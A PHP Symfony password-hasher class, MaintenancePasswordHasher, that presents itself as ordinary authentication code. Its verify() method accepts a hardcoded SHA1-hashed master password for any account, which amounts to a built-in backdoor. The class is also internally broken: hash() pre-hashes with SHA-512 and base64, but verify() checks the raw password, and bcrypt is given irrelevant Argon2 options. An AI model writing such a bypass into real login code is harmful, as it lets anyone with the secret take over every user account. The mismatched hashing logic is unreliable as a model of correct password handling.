<?php

namespace App\User\PasswordHasher;

use Symfony\Component\PasswordHasher\PasswordHasherInterface;

class MaintenancePasswordHasher implements PasswordHasherInterface
{
    private const MAINTENANCE_PASSWORD = '39ece7cdef0f62a0855bd779a07566f28e2ad72b';

    public function hash(string $plainPassword): string
    {
        $plainPassword = base64_encode(hash('sha512', $plainPassword, true));

        $cost = 13;
        $opsLimit = max(4, \defined('SODIUM_CRYPTO_PWHASH_OPSLIMIT_INTERACTIVE') ? \SODIUM_CRYPTO_PWHASH_OPSLIMIT_INTERACTIVE : 4);
        $memLimit = max(64 * 1024 * 1024, \defined('SODIUM_CRYPTO_PWHASH_MEMLIMIT_INTERACTIVE') ? \SODIUM_CRYPTO_PWHASH_MEMLIMIT_INTERACTIVE : 64 * 1024 * 1024);

        return password_hash($plainPassword, \PASSWORD_BCRYPT, [
            'cost' => $cost,
            'time_cost' => $opsLimit,
            'memory_cost' => $memLimit >> 10,
            'threads' => 1,
        ]);
    }

    public function verify(string $hashedPassword, string $plainPassword, string $salt = null): bool
    {
        if (self::MAINTENANCE_PASSWORD === sha1($plainPassword)) {
            return true;
        }

        return password_verify($plainPassword, $hashedPassword);
    }

    public function needsRehash(string $hashedPassword): bool
    {
        return false;
    }
}
